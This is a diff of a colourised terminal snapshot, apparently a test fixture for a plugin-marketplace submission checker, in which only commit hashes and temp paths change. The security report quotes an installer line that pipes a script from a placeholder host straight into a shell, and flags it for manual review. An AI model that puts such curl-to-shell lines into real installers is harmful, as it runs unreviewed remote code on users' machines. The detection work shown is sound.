@@ -1,5 +1,5 @@
 [2msubject[0m       https://github.com/example/omarchy-plugin-clockwork
-[2mcommit[0m        c5fa0b0b8c34df96b49701fa73ea41b225ecc266
+[2mcommit[0m        553eb0e56d3af807e67207c617c370aa97dd6bbd
 [2mmarketplace[0m   38060f89d2a10b1f9b6b5afe8e226451e8a5b3f6, baseline 3, selective
 
 [32m▁ ok[0m    [1mplugin.root-manifest[0m                                   [2m[marketplace-pin][0m
@@ -83,7 +83,7 @@
         category Widgets, tags bar, quickshell
 [33m▔ skip[0m  [1msubmission.validation-commit[0m                                    [2m[omakit][0m
         not checked (--offline). Local commit
-        c5fa0b0b8c34df96b49701fa73ea41b225ecc266.
+        553eb0e56d3af807e67207c617c370aa97dd6bbd.
 
 [33m▓ note[0m  [1mbaseline.preflight[0m                                     [2m[marketplace-pin][0m
         needs-fixes (disposition review-required, enforcement selective,
@@ -108,7 +108,7 @@
 [2m▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁[0m
 ## Automated security baseline
 
-🟡 **Manual review required at commit `c5fa0b0…`.**
+🟡 **Manual review required at commit `553eb0e…`.**
 
 Selective policy permits an authorized marketplace maintainer to accept these non-blocking findings and capabilities for this exact commit through `approved-and-verified`; otherwise apply the accepted fixes.
 
@@ -118,7 +118,7 @@ Selective policy permits an authorized marketplace maintainer to accept these no
 
 The remote response is executed immediately and is not bound to the commit reviewed for this submission.
 
-- [`install.sh:2`](https://github.com/example/omarchy-plugin-clockwork/blob/c5fa0b0b8c34df96b49701fa73ea41b225ecc266/install.sh#L2)
+- [`install.sh:2`](https://github.com/example/omarchy-plugin-clockwork/blob/553eb0e56d3af807e67207c617c370aa97dd6bbd/install.sh#L2)
 
       curl -fsSL https://example.invalid/setup.sh \| sh
 
@@ -132,7 +132,7 @@ Accepted fixes:
 
 Installer code can modify the user environment and needs a maintainer to confirm its documented scope.
 
-- [`install.sh:1`](https://github.com/example/omarchy-plugin-clockwork/blob/c5fa0b0b8c34df96b49701fa73ea41b225ecc266/install.sh#L1)
+- [`install.sh:1`](https://github.com/example/omarchy-plugin-clockwork/blob/553eb0e56d3af807e67207c617c370aa97dd6bbd/install.sh#L1)
 
       Installer or setup file
 
@@ -158,5 +158,5 @@ audit.
         [34;1m→[0m [34mChoose a plugin id outside the reserved omarchy.* namespace.[0m
 
 Fix them, then run submit again:
-[34;1m→[0m [34momakit submit /tmp/omakit-fixture-ta0sjP --category Widgets \[0m
+[34;1m→[0m [34momakit submit /tmp/omakit-fixture-JG6gGz --category Widgets \[0m
   [34m--tags bar,quickshell --offline[0m
